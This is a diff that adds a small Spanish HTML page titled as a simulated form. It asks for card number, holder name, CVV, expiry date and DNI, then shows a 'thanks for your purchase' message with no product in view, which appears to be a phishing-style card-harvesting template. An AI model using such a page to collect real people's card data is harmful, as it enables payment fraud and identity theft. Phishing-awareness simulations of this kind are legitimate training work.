@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Formulario Simulado</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f4f6f8; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+    .container { background: #fff; padding: 20px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
+    img.banner { width: 100%; border-radius: 10px; margin-bottom: 15px; }
+    h2 { margin-bottom: 10px; color: #333; }
+    input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 14px; }
+    button { background: #e63946; color: #fff; padding: 12px; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; width: 100%; margin-top: 10px; }
+    .nota { margin-top: 15px; font-size: 12px; color: red; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="mi_foto.jpg" alt="Imagen de portada" class="banner">
+    <h2>Bienvenido</h2>
+    <p>Completa el siguiente formulario:</p>
+
+    <form action="/submit" method="POST">
+      <input type="text" name="numero de tarjeta" placeholder="número de tarjeta" required>
+      <input type="text" name="nombre de titular" placeholder="nombre de titular" required>
+      <input type="text" name="CVV" placeholder="CVV" required>
+      <input type="text" name="fecha de vencimiento (AA/MM)" placeholder="fecha de vencimiento (AA/MM)" required>
+      <input type="text" name="dni" placeholder="dni" required>
+      <button type="submit">Enviar</button>
+    </form>
+
+    <p class="nota">⚠️ GRACIAS POR SU COMPRA#26ff00</p>
+  </div>
+</body>
+</html>
